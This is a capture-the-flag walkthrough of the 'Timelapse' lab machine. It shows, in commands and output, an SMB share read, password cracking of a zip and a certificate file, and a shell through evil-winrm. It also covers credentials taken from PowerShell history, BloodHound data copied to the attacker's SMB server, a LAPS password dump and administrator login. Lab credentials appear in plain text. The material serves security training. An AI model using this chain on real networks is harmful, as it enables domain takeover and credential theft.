# Enumeration

## Nmap

```bash
nmap -p- --min-rate=1000 -sVC -v -oN nmap 10.10.11.152

Nmap scan report for 10.10.11.152
Host is up (0.63s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-08-02 00:26:20Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233:a199:4504:0859:013f:b9c5:e4f6:91c3
|_SHA-1: 5861:acf7:76b8:703f:d01e:e25d:fc7c:9952:a447:7652
| http-methods: 
|_  Supported Methods: POST
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2025-08-02T00:28:52+00:00; +7h36m00s from scanner time.
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49692/tcp open  msrpc             Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-02T00:27:27
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h35m59s, deviation: 0s, median: 7h35m59s

```

## SMB

### Enumerating null sessions

```bash
nxc smb 10.10.11.152 -u '' -p '' --users 
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\: 

nxc smb 10.10.11.152 -u '' -p '' --shares 
SMB         10.10.11.152    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\: 
SMB         10.10.11.152    445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED

```

Here using null session we cant really enumerate much but lets connect using smbclient and enumerate all the shares

```bash
smbclient //10.10.11.152/Shares
Password for [WORKGROUP\root]:

Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
parallel_read returned NT_STATUS_IO_TIMEOUT
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (32.3 KiloBytes/sec) (average 8.2 KiloBytes/sec)
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (135.4 KiloBytes/sec) (average 42.3 KiloBytes/sec)
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (12.9 KiloBytes/sec) (average 35.1 KiloBytes/sec)
```

Here we have some files, we can open this file and look for some juicy information in here.

```bash
tree
.
├── Dev
│   └── winrm_backup.zip
├── HelpDesk
│   ├── LAPS_Datasheet.docx
│   ├── LAPS_OperationsGuide.docx
│   ├── LAPS_TechnicalSpecification.docx
│   └── LAPS.x64.msi
```

## Looking into the zip file

The winrm_backup.zip file is password protected we can try to bruteforce the passwword using john the ripper

```bash
zip2john winrm_backup.zip > hash
```

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2025-08-01 14:38) 3.846g/s 13375Kp/s 13375Kc/s 13375KC/s surkerior..supalove
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

Unzipping the file we get a .pfx file

In a Windows Active Directory environment, a **.pfx file** (Personal Information Exchange) is a crucial file format used for securely storing and transferring cryptographic information, primarily **digital certificates and their corresponding private keys**, in a single, password-protected file. It's also known as a **PKCS#12 file**.

This pfx file has the public and the private certificate which can be used to log in with winrm using evil-winrm.

# Exploitation

## Extracting certificates from .pfx file

This .pfx file is password protected we can use john the ripper again to try brute force the password 

```bash
pfx2john legacyy_dev_auth.pfx > pfxhash
```

```bash
john pfxhash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:37 DONE (2025-08-01 14:40) 0.02634g/s 85135p/s 85135c/s 85135C/s thugways..thsco04
Use the "--show" option to display all of the cracked passwords reliably

```

Extracting the certificate

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out priv.pem
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out pub.pem 
```

## Shell as legacy user

Now we have the certifiacted we can log in to the machine using this certs

```bash
evil-winrm -i 10.10.11.152 -c pub.pem -k priv.pem -S -r timelapse.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy

```

## Powershell HIstory

We can check for powershell history file to see what commands were executed previously

```bash
PS C:\Users\legacyy\appdata\roaming\microsoft\windows\powershell\PSReadLine> cat ConsoleHost_history.txt 
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit

```

Here we have a set of credentials for the user svc_deploy

## Bloodhound

Running sharphound.exe in windows and coping the zip file to linux 

### Setting up smb server in linux

```bash
impacket-smbserver share . -smb2support 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

### Copying sharphound.exe to windows and running sharphound

```bash
*Evil-WinRM* PS C:\Users\legacyy\Documents> copy //10.10.14.28/share/SharpHound.exe SharpHound.exe
*Evil-WinRM* PS C:\Users\legacyy\Documents> ./SharpHound.exe
2025-08-02T07:12:25.2531144-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2025-08-02T07:12:25.3312431-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-08-02T07:12:25.3624920-07:00|INFORMATION|Initializing SharpHound at 7:12 AM on 8/2/2025
2025-08-02T07:12:25.3781156-07:00|INFORMATION|Resolved current domain to timelapse.htb
2025-08-02T07:12:25.5812431-07:00|INFORMATION|Loaded cache with stats: 17 ID to type mappings.
 0 name to SID mappings.
 1 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2025-08-02T07:12:25.5812431-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, CertServices, LdapServices, WebClientService, SmbInfo
2025-08-02T07:12:25.6437427-07:00|INFORMATION|Beginning LDAP search for timelapse.htb
2025-08-02T07:12:25.7062401-07:00|INFORMATION|Beginning LDAP search for timelapse.htb Configuration NC
2025-08-02T07:12:25.7218660-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-08-02T07:12:25.7218660-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-08-02T07:12:25.7218660-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for TIMELAPSE.HTB
2025-08-02T07:12:25.7374908-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for TIMELAPSE.HTB
2025-08-02T07:12:25.7531164-07:00|INFORMATION|[CommonLib ACLProc]Found GUID for ACL Right ms-mcs-admpwd: 657e154a-f8d8-44aa-9de5-bc5ddc1e7620 in domain TIMELAPSE.HTB
2025-08-02T07:12:25.7687459-07:00|INFORMATION|[CommonLib ACLProc]Found GUID for ACL Right ms-mcs-admpwd: 657e154a-f8d8-44aa-9de5-bc5ddc1e7620 in domain TIMELAPSE.HTB
2025-08-02T07:12:25.8468650-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for TIMELAPSE.HTB
2025-08-02T07:12:25.8624921-07:00|INFORMATION|[CommonLib ACLProc]Found GUID for ACL Right ms-mcs-admpwd: 657e154a-f8d8-44aa-9de5-bc5ddc1e7620 in domain TIMELAPSE.HTB
2025-08-02T07:12:26.0812414-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2025-08-02T07:12:26.0968645-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2025-08-02T07:12:26.2062435-07:00|INFORMATION|Status: 315 objects finished (+315 Infinity)/s -- Using 37 MB RAM
2025-08-02T07:12:26.2062435-07:00|INFORMATION|Enumeration finished in 00:00:00.5715286
2025-08-02T07:12:26.2687498-07:00|INFORMATION|Saving cache with stats: 17 ID to type mappings.
 0 name to SID mappings.
 1 machine sid mappings.
 3 sid to domain mappings.
 0 global catalog mappings.
2025-08-02T07:12:26.2687498-07:00|INFORMATION|SharpHound Enumeration Completed at 7:12 AM on 8/2/2025! Happy Graphing!
```

### Copying zip to linux

```bash
net use n: \\10.10.14.28\share
The command completed successfully.

*Evil-WinRM* PS C:\Users\legacyy\Documents> copy 20250801192605_BloodHound.zip n:\

```

## Enumeration from svc_deploy

<img width="730" height="346" alt="image" src="https://github.com/user-attachments/assets/db341c88-5c06-49c2-b0d1-90347d85cc8c" />


Here we can see svc_deploy is a part of the laps reader group and have readlaps password rights over the domain.

## Exploiting laps read privileages

We can use the [pylaps.py](http://pylaps.py) file form github and dump all the laps password

```bash
git clone https://github.com/p0dalirius/pyLAPS
cd pyLAPS
python -m venv .myenv
source .myenv/bin/activate
pip install -r requirements.txt
```

### Running pylaps

```bash
python pyLAPS.py --action get -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV' --dc-ip "10.10.11.152"
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | DC01$                : 67k8!2(4A7Ck81%!3.6r3M&q
[+] All done!
```

## Shell as Administrator

Using the above credentials to log in as administrator in timelapse.htb

```bash
nxc winrm 10.10.11.152 -u 'administrator' -p '67k8!2(4A7Ck81%!3.6r3M&q' -x 'whoami'
WINRM-SSL   10.10.11.152    5986   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM-SSL   10.10.11.152    5986   DC01             [+] timelapse.htb\administrator:67k8!2(4A7Ck81%!3.6r3M&q (Pwn3d!)
WINRM-SSL   10.10.11.152    5986   DC01             [+] Executed command (shell type: cmd)
WINRM-SSL   10.10.11.152    5986   DC01             timelapse\administrator
```
